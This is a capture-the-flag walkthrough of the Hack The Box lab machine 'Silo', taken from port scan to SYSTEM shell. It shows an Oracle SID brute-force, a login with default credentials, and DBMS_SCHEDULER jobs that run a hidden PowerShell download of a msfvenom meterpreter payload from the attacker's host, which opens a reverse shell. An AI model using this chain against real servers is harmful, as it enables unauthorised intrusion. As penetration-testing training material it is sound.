# Target
| Category          | Details                                          |
|-------------------|--------------------------------------------------|
| 📝 **Name**       | [Silo](https://app.hackthebox.com/machines/Silo) |  
| 🏷 **Type**       | HTB Machine                                      |
| 🖥 **OS**         | Windows                                          |
| 🎯 **Difficulty** | Medium                                           |
| 📁 **Tags**       | Oracle DB                                        |

### User flag

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/HTB Silo]
└─$ nmap -sS -sC -sV -p- $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 16:32 +0100
Nmap scan report for 10.129.14.139
Host is up (0.11s latency).
Not shown: 65520 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   d 11.2.0.2.0 (unauthorized)
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
49162/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-03-22T15:34:29
|_  start_date: 2026-03-22T15:30:55
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.07 seconds
```

#### Search for valid Oracle DB SID
```
┌──(magicrc㉿perun)-[~/attack/HTB Silo]
└─$ nmap -p 1521 --script oracle-sid-brute $TARGET
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-22 16:46 +0100
Nmap scan report for 10.129.14.139
Host is up (0.027s latency).

PORT     STATE SERVICE
1521/tcp open  oracle
| oracle-sid-brute: 
|_  XE

Nmap done: 1 IP address (1 host up) scanned in 53.38 seconds
```

#### Use default `scott:tiger` credentials to access Oracle DB
```
┌──(magicrc㉿perun)-[~/attack/HTB Silo]
└─$ sqlplus scott/tiger@$TARGET:1521/XE as sysdba

SQL*Plus: Release 19.0.0.0.0 - Production on Mon Mar 23 06:56:24 2026
Version 19.6.0.0.0

Copyright (c) 1982, 2019, Oracle.  All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```

#### Check commands could be executed with `DBMS_SCHEDULER`
```
SQL> BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name => 'cmd_probe',
    job_type => 'EXECUTABLE',
    job_action => 'C:\Windows\System32\cmd.exe',
    number_of_arguments => 2,
    enabled => FALSE
  );
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_probe',1,'/c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('cmd_probe',2,'dir');
  DBMS_SCHEDULER.ENABLE('cmd_probe');
END;
/  2    3    4    5    6    7    8    9   10   11   12   13  

PL/SQL procedure successfully completed.
```

#### Generate and host `windows/x64/meterpreter/reverse_tcp` reverse shell
```
┌──(magicrc㉿perun)-[~/attack/HTB Silo]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe && \
python3 -m http.server 80
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7680 bytes
Saved as: shell.exe
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

#### Start Metasploit and listen for reverse shell connection
```
┌──(magicrc㉿perun)-[~/attack/HTB Silo]
└─$ msfconsole -q -x "use exploit/multi/handler; set LHOST tun0; set LPORT $LPORT; set payload windows/x64/meterpreter/reverse_tcp; run"
[*] Using configured payload generic/shell_reverse_tcp
LHOST => tun0
LPORT => 4444
payload => windows/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 10.10.16.193:4444 
```

#### Use `DBMS_SCHEDULER` to download `shell.exe` with `powershell`
```
SQL> BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name => 'download_reverse_shell',
    job_type => 'EXECUTABLE',
    job_action => 'C:\Windows\System32\cmd.exe',
    number_of_arguments => 2,
    enabled => FALSE
  );

  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('download_reverse_shell',1,'/c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('download_reverse_shell',2,'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-WebRequest http://10.10.16.193/s  2  hell.exe -OutFile C:\Users\Public\shell.exe"');
  DBMS_SCHEDULER.ENABLE('download_reverse_shell');
END;
/  3    4    5    6    7    8    9   10   11   12   13   14  

PL/SQL procedure successfully completed.
```

#### Use `DBMS_SCHEDULER` to execute `shell.exe`
```
SQL> BEGIN
  DBMS_SCHEDULER.CREATE_JOB (
    job_name => 'execute_reverse_shell',
    job_type => 'EXECUTABLE',
    job_action => 'C:\Windows\System32\cmd.exe',
    number_of_arguments => 2,
    enabled => FALSE
  );

  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('execute_reverse_shell',1,'/c');
  DBMS_SCHEDULER.SET_JOB_ARGUMENT_VALUE('execute_reverse_shell',2,'C:\Users\Public\shell.exe"');
  DBMS_SCHEDULER.ENABLE('execute_reverse_shell');
END;
/  2    3    4    5    6    7    8    9   10   11   12   13   14  

PL/SQL procedure successfully completed.
```

#### Confirm foothold gained
```
[*] Sending stage (230982 bytes) to 10.129.14.139
[*] Meterpreter session 1 opened (10.10.16.193:4444 -> 10.129.14.139:49166) at 2026-03-23 07:08:35 +0100

meterpreter >
```

#### Capture user flag
```
meterpreter > shell
Process 2720 created.
Channel 2 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>type C:\Users\Phineas\Desktop\user.txt
7ac168c607abe26751d2878864c26e42
```

### Root flag

#### Check current user
```
C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>whoami
nt authority\system
```
It seems that Oracle DB runs as `Administrator` user, thus no further escalation is needed.

#### Capture root flag
```
C:\oraclexe\app\oracle\product\11.2.0\server\DATABASE>type C:\Users\Administrator\Desktop\root.txt
9910ace8dcb6787e28e98711ada2b882
```
